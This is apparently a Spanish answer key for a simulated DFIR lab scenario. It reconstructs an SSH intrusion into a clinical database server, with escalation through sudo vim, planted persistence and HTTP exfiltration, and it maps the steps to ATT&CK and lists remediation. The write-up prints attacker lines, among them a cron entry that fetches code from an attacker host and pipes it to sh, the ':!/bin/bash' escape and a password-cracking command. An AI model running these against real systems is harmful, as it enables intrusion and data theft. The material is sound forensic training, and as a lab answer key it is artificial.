---
tags:
  - DFIR/Simulacion
  - DFIR/Linux
  - DFIR/Network
---

# Solución — Escenario 02

Los comandos se lanzan desde el directorio del escenario, con el triage extraído en `db01-triage-2026-09-30/`. Los filtros son de Wireshark y los comandos de red, de `tshark`.

```bash
tar xzf triage/db01-triage-2026-09-30.tar.gz
cd db01-triage-2026-09-30 && sha256sum -c manifest.sha256 --quiet && cd ..
T=db01-triage-2026-09-30/fs
P=captura/vlan-datos-2026-09-29.pcap
```

Una nota sobre la captura antes de empezar. El contenido de SSH siempre va cifrado: contraseñas, comandos y salida no se ven nunca. Lo único que viaja sin cifrar es la negociación previa: el banner de versión de cada lado, las listas de algoritmos (`KEXINIT`, de donde sale el HASSH) y los valores públicos del intercambio de claves. Después, la captura solo aporta metadatos: quién, cuándo, cuánto y a qué ritmo. Lo que el atacante hizo dentro de SSH sale del triage; lo que hizo por HTTP sí se ve entero en la captura.

## Visión general

```bash
grep -E "Accepted|Invalid user" $T/var/log/auth.log | grep -v 10.20.30.55
last -F -w -f $T/var/log/wtmp | head -6
```

Una semana después del incidente del portal, alguien entra en `db01` por SSH con la cuenta de sistema `portal_app` desde `198.51.100.212`. Escala a root con una regla de `sudoers.d` que permite ejecutar vim, deja tres persistencias (una cuenta, una clave SSH y un cron que llama a su servidor), vuelca la base de datos clínica y la saca por HTTP. Una hora después vuelve como root con la clave plantada. Alrededor hay ruido legítimo: la DBA, el backup nocturno, el portal consultando MariaDB y un escáner de internet que genera casi todos los fallos de autenticación.

## Respuestas

### 1. Primer acceso del atacante

**`portal_app` desde `198.51.100.212`, el 30 de septiembre a las 01:03:05**, con contraseña.

```
Sep 30 01:03:05 db01 sshd[97876]: Accepted password for portal_app from 198.51.100.212 port 51734 ssh2
```

Es el único `Accepted` desde una IP externa con contraseña. `wtmp` y `lastlog` lo confirman, y en la captura la conexión con puerto origen `51734` se abre a las 01:03:01.

```bash
lastlog -R "$PWD/$T"            # requiere root por el chroot
tshark -r $P -Y "tcp.port == 51734 && tcp.flags.syn == 1 && tcp.flags.ack == 0"
```

### 2. Usuarios probados antes de entrar

**`root` (dos veces), `nhollis`, `deploy` y `admin`.** Ninguno de los tres últimos existe en `db01`: `auth.log` los marca como `Invalid user`.

```bash
grep 198.51.100.212 $T/var/log/auth.log | grep -E "Failed|Invalid"
lastb -F -w -f $T/var/log/btmp | grep 198.51.100.212
grep -E "^(root|nhollis|deploy|admin):" $T/etc/passwd
```

Son cinco fallos en cuatro conexiones entre las 01:02:08 y las 01:02:52. La primera prueba `root` dos veces y se corta con `Connection closed ... [preauth]`, el patrón de alguien que pulsa Ctrl-C en el cliente.

### 3. La IP con más fallos

**`203.0.113.77`, con 192 intentos entre las 23:41:10 y las 00:36:22. No es el atacante.**

```bash
grep "Failed password" $T/var/log/auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn | head -3
lastb -w -f $T/var/log/btmp | grep -c 203.0.113.77
grep "Failed password" $T/var/log/auth.log | grep 203.0.113.77 | sed 's/invalid user //' | awk '{print $9}' | sort | uniq -c | sort -rn
```

Se descarta por cuatro motivos:

- **Nunca entra.** No hay ningún `Accepted` desde esa IP.
- **Prueba usuarios genéricos de diccionario**, como `root`, `postgres`, `guest`, `oracle` o `pi`, ninguno ligado a Kelbrook.
- **Cadencia de máquina.** Hace un intento por conexión cada 15 a 20 segundos durante 55 minutos y cierra cada vez con `Bye Bye`.
- **Otro cliente.** En la captura se anuncia como `SSH-2.0-libssh2_1.10.0`, una librería típica de herramientas de fuerza bruta, frente al OpenSSH del atacante (ver pregunta 18).

`btmp` cubre todo septiembre y muestra que este ruido de fondo es constante; `auth.log` solo llega hasta su rotación del 27.

### 4. Relación con el incidente del 23 de septiembre

El atacante reutiliza lo que robó de `web01`:

- **La contraseña.** En el escenario 01 leyó `config.php` con `DB_USER portal_app` y `DB_PASS Kb!portal#2024`. En `db01` existe una cuenta de sistema `portal_app` y su hash de `/etc/shadow` verifica con esa misma contraseña. IT rotó las claves del panel, pero no esta.
- **Los usuarios.** `nhollis` y `deploy` no existen en `db01`; son los usuarios del `/etc/passwd` de `web01` que el atacante leyó por LFI en el escenario 01.

La IP cambia (`198.51.100.37` en el 01, `198.51.100.212` aquí), así que la unión no puede hacerse por IP.

```bash
python3 -I - <<'EOF'
import ctypes, ctypes.util
c = ctypes.CDLL(ctypes.util.find_library("crypt")); c.crypt.restype = ctypes.c_char_p
h = [l.split(":")[1] for l in open("db01-triage-2026-09-30/fs/etc/shadow") if l.startswith("portal_app:")][0]
print(c.crypt(b"Kb!portal#2024", h.encode()).decode() == h)
EOF
```

El hash es yescrypt (`$y$`), el formato por defecto de Ubuntu 22.04. La verificación usa la `libcrypt` del propio sistema.

### 5. Escalada a root

**Con `sudo` sobre vim y un escape a shell desde el editor.**

```
Sep 30 01:10:18 db01 sudo: portal_app : TTY=pts/0 ; PWD=/home/portal_app ; USER=root ; COMMAND=/usr/bin/vim /etc/mysql/mariadb.conf.d/50-server.cnf
```

El otro artefacto es `/root/.viminfo`. Vim se ejecutó como root con `HOME=/root` y al salir guardó su historial de comandos:

```
# Command Line History (newest to oldest):
:q!
|2,0,1790731579,,"q!"
:!/bin/bash
|2,0,1790730627,,"!/bin/bash"
```

`:!/bin/bash` a las 01:10:27 abre una shell de root hija de vim. Antes, a las 01:05:41, `auth.log` registra `COMMAND=list`, es decir, un `sudo -l` para ver qué podía ejecutar. La sesión de sudo se cierra a las 01:26:19, cuando sale de vim con `:q!`. `50-server.cnf` conserva su fecha de 2025: el editor fue el vehículo, no el objetivo.

```bash
grep "sudo:" $T/var/log/auth.log | grep portal_app
date -u -d @1790730627
ls -l --time-style=full-iso $T/etc/mysql/mariadb.conf.d/50-server.cnf
```

### 6. Configuración que lo permitió

**`/etc/sudoers.d/portal_app`**, añadido por la DBA el 12 de agosto de 2026 para el despliegue:

```
portal_app ALL=(root) NOPASSWD: /usr/bin/vim /etc/mysql/mariadb.conf.d/*
```

Permitir un editor como root equivale a permitir una shell de root: vim ejecuta comandos con `:!`. El propio fichero lo marca como "Pendiente de revisar". Contribuyen además `PasswordAuthentication yes` en `sshd_config` y el reenvío del puerto 2222 público.

### 7. Cuenta nueva

**`support`, UID 1004, en el grupo `sudo`, creada a las 01:15:02.** La contraseña se fija a las 01:15:19.

```bash
grep -E "useradd|passwd\[" $T/var/log/auth.log
grep support $T/etc/passwd $T/etc/group
ls -la --time-style=full-iso $T/home/support
```

`/home/support` solo tiene los ficheros de `/etc/skel` y no hay historial: la cuenta no llegó a usarse. Es una puerta de respaldo con privilegios de sudo.

### 8. Clave SSH añadida

**Una clave ed25519 en `/root/.ssh/authorized_keys`, con comentario `ops@kelbrook-backup`.** El comentario imita un nombre interno para pasar desapercibido.

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPXqM94x3c/BKaKSlf/5Bm5Q8dwGuo4K0LBlNQrVwlF/ ops@kelbrook-backup
```

Su huella es `SHA256:iYfVQlxqXPJvDFbBtP7mEnM+VWT2i7nyo+aem9s2R+Q`, la misma del acceso como root de las 02:05:17:

```bash
ssh-keygen -lf $T/root/.ssh/authorized_keys      # o el equivalente en Python:
python3 -I -c "import base64,hashlib;b=base64.b64decode(open('$T/root/.ssh/authorized_keys').read().split()[1]);print(base64.b64encode(hashlib.sha256(b).digest()).decode().rstrip('='))"
grep "Accepted publickey for root" $T/var/log/auth.log
```

En `live/stat.txt`, el fichero nace a las 01:16:20, cambia de permisos a las 01:16:31 (el `chmod 600`) y se lee por última vez a las 02:05:17, cuando sshd lo consulta en el segundo acceso.

### 9. Ejecución periódica

**`/etc/cron.d/mariadb-health`, cada 10 minutos, como root:**

```
*/10 * * * * root curl -s http://198.51.100.212:8080/c/$(hostname) | sh
```

Cada ejecución pide `http://198.51.100.212:8080/c/db01` y ejecuta con `sh` lo que el servidor devuelva. Es un canal de mando: esa noche el servidor responde vacío, pero el atacante puede mandar órdenes cuando quiera. El nombre imita un chequeo de salud de MariaDB. `syslog` registra la carga del fichero a las 01:18:01:

```
Sep 30 01:18:01 db01 cron[812]: (*system*mariadb-health) RELOAD (/etc/cron.d/mariadb-health)
```

### 10. Primera ejecución y repeticiones

**Primera a las 01:20:01. Aparece 10 veces en la captura**, de 01:20 a 02:50, y 43 veces en `syslog` hasta la recogida del triage.

```bash
grep "curl -s" $T/var/log/syslog | head -1
grep -c "curl -s" $T/var/log/syslog
tshark -r $P -Y 'http.request.uri == "/c/db01"' -T fields -e frame.time_utc -e http.user_agent
```

Las peticiones van en claro, con `User-Agent: curl/7.81.0`, y el servidor se identifica como `BaseHTTP/0.6 Python/3.11.2`. No hay consulta DNS previa: la IP va escrita en el cron.

Hay que filtrar por el comando. Contar sesiones de cron de root en `auth.log` da un número mucho mayor, porque `/etc/cron.d/sysstat` también corre cada 10 minutos, en los minutos 5, 15, 25... (ver trampas).

### 11. Datos exfiltrados

**`kb_clinica.tgz`, de 119 839 bytes, enviado por HTTP en claro con un `POST` multipart a `http://198.51.100.212:8080/up`** a las 01:24.

```bash
tshark -r $P -Y 'http.request.method == "POST"' -T fields -e frame.time_utc -e ip.dst -e http.request.uri -e http.content_length
tshark -r $P -Y 'mime_multipart.header.content-disposition' -T fields -e mime_multipart.header.content-disposition
```

El `Content-Length` es de 120 042 bytes porque incluye las cabeceras y los delimitadores del multipart. Para obtener el fichero, se exportan los objetos HTTP y se recorta la parte:

```bash
tshark -r $P --export-objects http,objetos
python3 -I - <<'EOF'
d = open("objetos/up", "rb").read()
open("kb_clinica.tgz", "wb").write(d[d.index(b"\r\n\r\n") + 4:d.rindex(b"\r\n--")])
EOF
ls -l kb_clinica.tgz && sha256sum kb_clinica.tgz && tar tzvf kb_clinica.tgz
```

El SHA-256 es `f20d3ba5f9a597d5ce36cceaa62124c91005de196878184b6c4ec2df47ba9ec6`. Dentro hay un único `kb_clinica.sql` de 587 328 bytes con fecha 01:21.

Un detalle de la captura: curl manda las cabeceras con `Expect: 100-continue` a las 01:24:05 y espera. El servidor, que habla HTTP/1.0, no contesta `100 Continue`, y curl envía el cuerpo un segundo después, a las 01:24:06.

### 12. Pacientes exfiltrados

**1 240.** El volcado tiene las tablas `citas` (3 180 filas), `historias` (2 075), `medicos` (12) y `pacientes`.

```bash
tar xzf kb_clinica.tgz -O | grep -o "AUTO_INCREMENT=[0-9]*"
echo $(( $(tar xzf kb_clinica.tgz -O | grep 'INSERT INTO `pacientes`' | grep -o '),(' | wc -l) + 1 ))
```

`mysqldump` escribe cada tabla en un único `INSERT` con todas las filas, así que se cuentan los separadores `),(` y se suma uno. `AUTO_INCREMENT=1241` lo confirma. Son datos de salud con DNI, contacto, diagnósticos y notas clínicas, lo que obliga a notificar la brecha.

### 13. Directorio de preparación

**`/var/tmp/.font-cache`.** El punto inicial lo oculta de un `ls` normal y el nombre imita una caché del sistema. Allí escribió el volcado a las 01:20:58, lo comprimió a las 01:23:10 y **lo borró con `rm -rf` a las 01:25:30**.

```bash
grep -n "font-cache" $T/root/.bash_history
ls -lad --time-style=full-iso $T/var/tmp
grep -A7 "File: /var/tmp" db01-triage-2026-09-30/live/stat.txt
```

El directorio ya no existe, pero `/var/tmp` tiene su última modificación a las 01:25:30. Borrar una entrada cambia la fecha del directorio padre.

### 14. El historial de `portal_app`

**Solo queda un `exit` suelto con marca 01:27:02**, detrás de los comandos del despliegue del 18 de septiembre.

```bash
awk '/^#[0-9]+$/{c="date -u -d @"substr($0,2)" +\"%F %T\""; c | getline d; close(c); next} {print d"  "$0}' $T/home/portal_app/.bash_history
```

Es la huella de `history -c`. El comando vacía el historial en memoria y bash solo guarda al salir lo que se teclea después: el `exit`. Todo lo que hizo como `portal_app` se reconstruye con otras fuentes:

- **`auth.log`.** Muestra el login, el `sudo -l`, el `sudo vim` y la salida.
- **`wtmp` y `lastlog`.** Dan la sesión de 01:03:05 a 01:27:03.
- **`/root/.viminfo`.** Muestra el escape a shell.
- **`/root/.bash_history`.** Recoge todo lo que hizo como root. Esa shell es otro proceso con otro fichero de historial y el atacante no lo limpió.
- **La captura.** No muestra comandos, pero sí ráfagas de pulsaciones con su eco y salidas grandes del servidor, como la de `ps aux` a las 01:07:35.

### 15. Duración y regreso

**La sesión inicial dura 23 minutos y 58 segundos**, de 01:03:05 a 01:27:03. **Vuelve a las 02:05:17 como `root` con `publickey`**, con la clave que plantó, y se queda 1 minuto y 45 segundos.

```bash
last -F -w -f $T/var/log/wtmp | grep 198.51.100.212
awk '/^#[0-9]+$/{c="date -u -d @"substr($0,2)" +\"%F %T\""; c | getline d; close(c); next} {print d"  "$0}' $T/root/.bash_history | tail -6
```

En el regreso solo comprueba que sus persistencias siguen ahí: `id`, `crontab -l`, el fichero del cron, el final de `/etc/passwd` y `w`.

### 16. La transferencia SSH grande

**Es el backup nocturno a `nas01` (`10.20.30.40`).** Sale de `db01` a las 23:03:28, mueve unos 2,5 MB en medio segundo y es legítimo.

```bash
tshark -r $P -q -z conv,tcp | grep 10.20.30.40
tshark -r $P -Y dns -T fields -e frame.time_utc -e dns.qry.name -e dns.a
cat $T/etc/cron.d/db-backup $T/usr/local/bin/db-backup.sh
grep -E "\(backup\)|db-backup:" $T/var/log/syslog.1
```

Se descarta porque todas las fuentes cuentan lo mismo:

- **Cron.** `/etc/cron.d/db-backup` lo lanza a las 23:00 como `backup`, y `syslog.1` registra el `CMD` a las 23:00:01.
- **Script.** `db-backup.sh` hace `mysqldump`, después `rsync` por SSH a `nas01.kelbrook.internal` y termina con un `logger`.
- **Red.** La consulta DNS de `nas01.kelbrook.internal` sale un instante antes de la conexión.
- **Cierre.** `syslog.1` registra a las 23:03:29 `db-backup: copia 2026-09-29 enviada a nas01`.

El volumen no es una señal de exfiltración por sí mismo. El robo real pesó 120 KB y fue a una IP externa.

### 17. Extra: contraseña de `support`

**`Soporte2026!`.** Cae con una lista corta de contraseñas típicas de "año y exclamación":

```bash
grep '^support:' $T/etc/shadow > support.hash
john --format=crypt --wordlist=lista.txt support.hash
```

John the Ripper (versión jumbo) delega los hashes yescrypt en la `crypt()` del sistema con `--format=crypt`. hashcat no soporta yescrypt. El mismo snippet de Python de la pregunta 4 sirve para comprobar una lista pequeña.

### 18. Extra: separar clientes sin descifrar

Cada actor usa un cliente SSH distinto, y el banner y el HASSH se ven en claro antes del cifrado:

| Actor | Banner | HASSH |
| --- | --- | --- |
| Atacante (`198.51.100.212`) | `SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3` | `c11b200866cf918393e62ea25d851d90` |
| Escáner (`203.0.113.77`) | `SSH-2.0-libssh2_1.10.0` | `b4b8ae3d7241d2c1dc54b4df7e8c19d1` |
| DBA (`10.20.30.55`) | `SSH-2.0-PuTTY_Release_0.76` | `59e381f5af200c31d0b53cf5f2ea6518` |
| `db01` hacia `nas01` (backup) | `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10` | `e1d88fdd485f9c710074daa1fcce80a6` |

```bash
tshark -r $P -Y ssh.protocol -T fields -e ip.src -e ssh.protocol | sort | uniq -c
tshark -r $P -Y ssh.kex.hassh -T fields -e ip.src -e ssh.kex.hassh | sort | uniq -c
tshark -r $P -q -z conv,tcp | grep ":22 "
```

Los metadatos completan la separación:

- **Escáner.** Conexiones de pocos segundos y menos de 6 KB, siempre iguales.
- **Atacante.** Cuatro conexiones cortas fallidas y después dos sesiones interactivas largas.
- **DBA.** Una sesión interactiva de 15 minutos desde la red interna.
- **Backup.** Una sola ráfaga de 2,5 MB de salida.

Un detalle menor para el informe: la DBA usa PuTTY 0.76, una versión de 2021.

## Línea temporal

Ruido legítimo y equipo de respuesta, en cursiva.

| Hora UTC | Actor | Acción | Evidencia |
| --- | --- | --- | --- |
| *29/09 22:03:10 – 22:17:48* | *DBA* | *Revisión desde `ws-it-02` con `sudo mysql`* | *`auth.log`, `wtmp`, historial de `mvega`, PCAP* |
| *23:00:01 – 23:03:29* | *backup* | *Volcado y `rsync` a `nas01`* | *`cron.d/db-backup`, `syslog.1`, PCAP* |
| *23:41:10 – 00:36:22* | *Escáner* | *192 intentos desde `203.0.113.77`* | *`auth.log`, `btmp`, PCAP* |
| 30/09 01:02:08 – 01:02:52 | Atacante | 5 contraseñas fallidas: `root`, `nhollis`, `deploy`, `admin` | `auth.log`, `btmp` |
| 01:03:05 | Atacante | Login como `portal_app` con la contraseña reutilizada | `auth.log`, `wtmp`, `lastlog`, `shadow` |
| 01:03 – 01:09 | Atacante | Reconocimiento; `sudo -l` a las 01:05:41 | `auth.log` (`COMMAND=list`), PCAP |
| 01:10:18 – 01:10:27 | Atacante | `sudo vim` y `:!/bin/bash`: shell de root | `auth.log`, `.viminfo` |
| 01:10:31 – 01:13:20 | Atacante | Lee `/etc/shadow` y enumera las bases de datos | `/root/.bash_history` |
| 01:15:02 – 01:15:19 | Atacante | Crea `support` (UID 1004, `sudo`) y le pone contraseña | `auth.log`, `passwd`, `group`, `shadow` |
| 01:16:05 – 01:16:31 | Atacante | Clave en `/root/.ssh/authorized_keys` | historial, `live/stat.txt` |
| 01:17:40 | Atacante | Cron `mariadb-health`; cron lo carga a las 01:18:01 | historial, `cron.d`, `syslog` |
| 01:20:01 | Atacante | Primer beacon a `198.51.100.212:8080` y cada 10 min | `syslog`, PCAP |
| 01:20:40 – 01:23:10 | Atacante | `mysqldump kb_clinica` y `tar` en `/var/tmp/.font-cache` | historial |
| 01:24:05 – 01:24:06 | Atacante | `POST /up` con `kb_clinica.tgz` (119 839 bytes) | PCAP, historial |
| 01:25:30 | Atacante | `rm -rf /var/tmp/.font-cache` | historial, mtime de `/var/tmp` |
| 01:26:12 – 01:27:03 | Atacante | Sale de root y de vim, `history -c` y cierra | `auth.log`, `.viminfo`, historial de `portal_app`, `wtmp` |
| 02:05:17 – 02:07:02 | Atacante | Vuelve como root con la clave plantada y comprueba sus persistencias | `auth.log`, `wtmp`, historial |
| *04:12* | *Escáner 2* | *8 intentos desde `203.0.113.140`* | *`auth.log`, `btmp`* |
| *08:04:37* | *DBA* | *Entra, encuentra el cron y avisa* | *`auth.log`, `wtmp`, `live/who.txt`* |
| *08:27:50 – 08:28:12* | *Respuesta* | *`sudo /bin/bash /tmp/ir-collect.sh`, recogida del triage* | *`auth.log`, `live/`* |

## Mapa ATT&CK

| Táctica | Técnica | Evidencia |
| --- | --- | --- |
| Acceso inicial | T1078.003 Valid Accounts: Local Accounts | `Accepted password for portal_app` |
| Credenciales | T1110.001 Brute Force: Password Guessing | 5 fallos previos en `auth.log` y `btmp` |
| Descubrimiento | T1033 System Owner/User Discovery, T1082 System Information Discovery, T1087.001 Local Account | `sudo -l`; `id`, `uname`, `cat /etc/passwd` (ráfagas en el PCAP) |
| Escalada | T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching | `COMMAND=/usr/bin/vim`, `sudoers.d/portal_app`, `.viminfo` |
| Credenciales | T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow | `cat /etc/shadow` en el historial de root |
| Persistencia | T1136.001 Create Account: Local Account | `useradd` de `support` |
| Persistencia | T1098.004 Account Manipulation: SSH Authorized Keys | `authorized_keys`, login de root por clave |
| Persistencia y mando | T1053.003 Scheduled Task/Job: Cron | `cron.d/mariadb-health`, beacons |
| Mando y control | T1071.001 Application Layer Protocol: Web Protocols | `GET /c/db01` cada 10 minutos |
| Recolección | T1005 Data from Local System, T1560.001 Archive via Utility | `mysqldump`, `tar czf` |
| Exfiltración | T1041 Exfiltration Over C2 Channel | `POST /up` en claro al mismo servidor y protocolo que los beacons |
| Evasión | T1070.003 Clear Command History, T1070.004 File Deletion, T1036.005 Masquerading: Match Legitimate Resource Name or Location | `history -c`, `rm -rf`, `.font-cache`, `mariadb-health`, `ops@kelbrook-backup` |

## Trampas del escenario

1. **El escáner.** `203.0.113.77` tiene casi cuarenta veces más fallos que el atacante. Quien siga "la IP con más fallos" se equivoca de hilo.
2. **La IP cambia respecto al 01.** El vínculo está en la cuenta `portal_app`, en el hash que verifica con la contraseña robada y en los usuarios `nhollis` y `deploy`.
3. **Historial borrado, pero no del todo.** `portal_app` deja un `exit` suelto. La shell de root escapada de vim tiene su propio historial y quedó intacto.
4. **Tráfico saliente legítimo.** El backup a `nas01` mueve veinte veces más que la exfiltración. Lo que delata el robo es el destino, no el tamaño.
5. **`50-server.cnf` intacto.** El `sudo vim` no cambió la configuración de MariaDB. Buscar modificaciones ahí no lleva a nada.
6. **Dos crons cada 10 minutos.** `sysstat` corre en los minutos 5, 15, 25...; el malicioso, en 0, 10, 20... Entre la 01:00 y las 03:00 hay 26 sesiones de cron de root en `auth.log` y solo 10 son del atacante.
7. **La huella propia.** El `sudo` de las 08:27:50, la sesión abierta de `mvega` y el `/tmp/ir-collect.sh` de `live/ls-tmpdirs.txt` son del equipo de respuesta. En `wtmp` esa sesión aparece como `gone - no logout` porque se leyó fuera del sistema; `live/who.txt` la muestra conectada.
8. **Distractores de cuentas.** `jnavarro` está bloqueada desde junio y `kbadmin` no entra desde 2025. Ninguna participa.

## IOCs

| Tipo | Valor |
| --- | --- |
| IP del atacante | `198.51.100.212` (SSH entrante, HTTP saliente a `:8080`) |
| URL de mando | `http://198.51.100.212:8080/c/db01` |
| URL de exfiltración | `http://198.51.100.212:8080/up` |
| Cliente SSH del atacante | `SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3`, HASSH `c11b200866cf918393e62ea25d851d90` |
| Clave SSH | `ssh-ed25519 ... ops@kelbrook-backup`, `SHA256:iYfVQlxqXPJvDFbBtP7mEnM+VWT2i7nyo+aem9s2R+Q` |
| Cuenta creada | `support` (UID 1004, grupo `sudo`) |
| Fichero de cron | `/etc/cron.d/mariadb-health` |
| Directorio de preparación | `/var/tmp/.font-cache` |
| Fichero exfiltrado | `kb_clinica.tgz`, SHA-256 `f20d3ba5f9a597d5ce36cceaa62124c91005de196878184b6c4ec2df47ba9ec6` |
| Credencial comprometida | `portal_app` / `Kb!portal#2024` |

## Persistencias que hay que eliminar

1. **El cron.** Hay que borrar `/etc/cron.d/mariadb-health` y bloquear la salida hacia `198.51.100.212`, en especial al puerto 8080.
2. **La clave plantada.** Su línea se elimina de `/root/.ssh/authorized_keys`; root no tenía ninguna clave antes del incidente.
3. **La cuenta `support`.** Se borra con `userdel -r support` tras conservar sus metadatos como evidencia.
4. **La puerta de entrada.** La contraseña de `portal_app` se rota, igual que la del usuario de MariaDB, y se retira `/etc/sudoers.d/portal_app`.

Que el servidor respondiera vacío esa noche no prueba que no llegara a ejecutar nada. Entre las 03:00 y las 08:28 hubo 33 ejecuciones más fuera de la captura. Antes de dar el sistema por limpio hay que revisar los registros del cortafuegos de esa franja o reconstruir `db01`.

## Recomendaciones

1. **Cerrar el SSH público y la contraseña.** Hay que retirar el reenvío del 2222 o limitarlo a una VPN, poner `PasswordAuthentication no` y añadir fail2ban o similar. Las 192 pruebas del escáner pasaron sin bloqueo.
2. **No dar editores por sudo y separar credenciales.** Para editar configuración con privilegios se usa `sudoedit`, que no da shell. Ninguna cuenta del sistema debe compartir contraseña con un usuario de base de datos. Tras el incidente del 01 había que rotar todas las credenciales expuestas, no solo las del panel.
3. **Detectar y notificar.** Conviene alertar de cambios en `/etc/cron.d`, `authorized_keys` y el grupo `sudo`, de `sudo` con editores y de conexiones salientes de `db01` a internet. La exfiltración de 1 240 historias clínicas con DNI obliga a notificar a la autoridad de protección de datos y a los afectados.

## Notas de autor

### Premisa y entorno

Tras el escenario 01, IT rotó las contraseñas del panel pero no la de la base de datos. En `db01` existe una cuenta de sistema `portal_app` con esa misma contraseña, creada para los scripts de despliegue. El cortafuegos del proveedor reenvía el `TCP/2222` público al `22` de `db01` sin traducir el origen, así que `db01` ve la IP real del cliente. El sensor está en el puerto espejo del switch de `db01`: lo que no está en la VLAN de datos llega con la MAC de `fw01`.

| Activo | IP | Papel |
| --- | --- | --- |
| `db01` | `10.20.30.20` | Ubuntu 22.04.5, MariaDB 10.6, OpenSSH 8.9p1, reloj en UTC. Víctima |
| `web01` | `10.20.30.10` | Portal; consulta MariaDB de forma continua |
| `nas01` | `10.20.30.40` | Destino del backup nocturno |
| `ws-it-02` | `10.20.30.55` | Puesto Windows de la DBA, PuTTY 0.76 |
| `dns01` / `fw01` | `10.20.30.2` / `10.20.30.1` | Resolvedor y cortafuegos |
| Atacante | `198.51.100.212` | VPS con OpenSSH 8.4 y un servidor HTTP en Python en el 8080 |
| Escáneres | `203.0.113.77`, `203.0.113.140` y otros | Ruido de internet |

| Cuenta | UID | Papel |
| --- | --- | --- |
| `root` | 0 | Contraseña bloqueada; `PermitRootLogin prohibit-password` |
| `backup` | 34 | Cuenta de sistema; ejecuta el backup |
| `kbadmin` | 1000 | Cuenta de instalación del proveedor |
| `mvega` | 1001 | Marta Vega, DBA, grupo `sudo` |
| `portal_app` | 1002 | Despliegue; contraseña reutilizada |
| `jnavarro` | 1003 | Excontratista, bloqueada |
| `support` | 1004 | Creada por el atacante |

La DBA añadió a `/etc/bash.bashrc` un bloque con `HISTTIMEFORMAT`, `HISTSIZE` y `histappend`. Por eso todos los historiales llevan marca de tiempo. Va en `bash.bashrc` y no en `profile.d` porque `profile.d` solo lo leen las shells de login, y la que sale de vim es interactiva pero no de login.

### Cómo se generan las evidencias

`generar_escenario.py` produce la captura y el triage desde una única línea temporal, con semilla fija. Dos ejecuciones dan ficheros idénticos byte a byte. Necesita `scapy`.

- **SSH.** Banners, `KEXINIT` e intercambio curve25519 con formato real; después, paquetes cifrados del tamaño que tocaría según el cifrado negociado. La sesión interactiva se modela por pulsaciones, eco y salida.
- **Resto del tráfico.** MySQL del portal con el protocolo real, HTTP del cron y de la exfiltración, DNS y NTP.
- **Logs de texto.** Formato de rsyslog de Ubuntu, con `auth.log` desde su rotación semanal y `syslog` cortado en el HUP diario.
- **Binarios.** `wtmp` y `btmp` con el `struct utmp` de glibc x86_64, de 384 bytes, y `lastlog` indexado por UID.
- **PIDs y puertos efímeros.** Se reparten al final en orden cronológico, desde el arranque del 14 de septiembre, para que nunca retrocedan.
- **`/etc/shadow`.** Hashes yescrypt reales.
- **Tar del triage.** Sigue el orden de GNU tar y conserva fechas, modos y propietarios, también de los directorios.

Se eligieron clientes que negocian curve25519 porque Wireshark 4.2 no reconoce el tamaño de clave del intercambio híbrido sntrup761 y marcaría error. La exfiltración va en claro a propósito, para poder recuperar el fichero; un escenario posterior puede hacerla por TLS. La captura y el triage se validaron con tshark 4.2 sin paquetes malformados ni avisos, y con `last`, `lastb`, `utmpdump` y `lastlog -R`.

El cron sigue activo cuando se recoge el triage, así que el caso queda abierto para un posible escenario 03.
